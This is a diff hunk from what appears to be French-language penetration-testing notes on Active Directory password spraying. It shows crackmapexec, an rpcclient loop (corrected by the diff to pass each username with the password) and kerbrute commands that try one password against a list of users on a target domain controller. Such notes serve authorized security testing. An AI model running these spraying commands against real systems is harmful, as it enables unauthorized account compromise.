@@ -90,7 +90,7 @@ Attaque à partir d'une liste d'utilisateurs avec un mot de passe `$AD_PASSWORD`
 cme smb $TARGET_IP -u users.txt -p $AD_PASSWORD --continue-on-success | grep '+'
 
 # rpcclient
-for u in $(cat users.txt);do rpcclient -U "$AD_PASSWORD" -c "getusername;quit" $TARGET_IP | grep Authority; done
+for u in $(cat users.txt);do rpcclient -U "$u%$AD_PASSWORD" -c "getusername;quit" $TARGET_IP | grep Authority; done
 
 # kerbrute
 kerbrute passwordspray -d $AD_DOMAIN --dc $TARGET_IP users.txt  "$AD_PASSWORD"
